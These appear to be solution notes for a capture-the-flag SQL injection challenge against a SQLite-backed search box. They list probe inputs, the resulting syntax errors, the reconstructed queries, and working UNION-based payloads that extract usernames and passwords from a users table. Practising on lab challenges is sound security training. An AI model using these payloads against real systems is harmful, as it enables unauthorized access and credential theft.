-- Use: textbox: Search

a' a --
'

Warning: SQLite3::query(): Unable to prepare statement: 1, near "a": syntax error in /challenge/web-serveur/ch19/index.php on line 150
near "a": syntax error


SELECT * FROM search WHERE searchString LIKE '%<search>%'

Warning: SQLite3::query(): Unable to prepare statement: 1, near "" a%' or description like '%a '"": syntax error in /challenge/web-serveur/ch19/index.php on line 150
near "" a%' or description like '%a '"": syntax error

SELECT * FROM search WHERE description LIKE '<search>%' or description LIKE '%<search>';
recherche' or description LIKE '%'; --
'

recherche' or description LIKE '%' union select username,password from 'users';--
'

(After thought) This also works:
    recherche' union select username,password from 'users';--